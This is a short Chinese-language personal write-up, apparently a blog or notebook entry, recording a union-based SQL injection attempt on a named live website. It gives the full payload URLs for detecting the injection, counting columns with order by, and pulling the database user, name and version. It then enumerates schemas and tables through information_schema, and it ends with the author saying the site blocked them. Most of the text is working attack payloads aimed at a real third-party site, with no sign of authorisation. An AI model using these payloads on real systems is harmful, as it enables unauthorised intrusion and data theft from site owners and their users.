#实战：SQL注入 #

#### 2018/9/12 15:12:28    ####
----------

* 找到被入侵的网站  
	`http://unisscan.cn/list.php?id=1`
* 后面接and 1=1 返回主页，股从旁边找其他网页注入点  
	`http://unisscan.cn/list.php?lei=246`
* 通过 and 1=1,1=2出现不同结果，故此处注入，使用order by x --   (后面接空格)  

    	http://unisscan.cn/list.php?lei=246 order by 31-- 
* 查出31个字段，判断显示的位置  

    	http://unisscan.cn/list.php?lei=246 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- 
	![](images\real_sql1.PNG)  
	得知2,8,11可以输出显示
* 获取基本信息  
    	http://unisscan.cn/list.php?lei=246 and 1=2 union select 1,user(),3,4,5,6,7,database(),9,10,version(),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- 

	![](images\real_sql2.PNG)

* 可以玩information_schema  
	根据sql注入技巧

    	select group_concat(schema_name) from information_schema.schemata
    	select schema_name from information_schema.schemata limit 0,1  #查询数据库
    	select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
    	select column_name from information_schema.columns where table_name='users' limit 0,1;  #查询列

	以下url：  
暴库

    	http://unisscan.cn/list.php?lei=246 and 1=2 union select 1,group_concat(schema_name),3,4,5,6,7,database(),9,10,version(),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 from information_schema.schemata -- 
爆表

    	http://unisscan.cn/list.php?lei=246 and 1=2 union select 1,2,3,4,5,6,7,group_concat(table_name),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 from information_schema.tables where table_schema='uniscan' -- 
然后，禁止我进入这个网站了，不知道是什么原因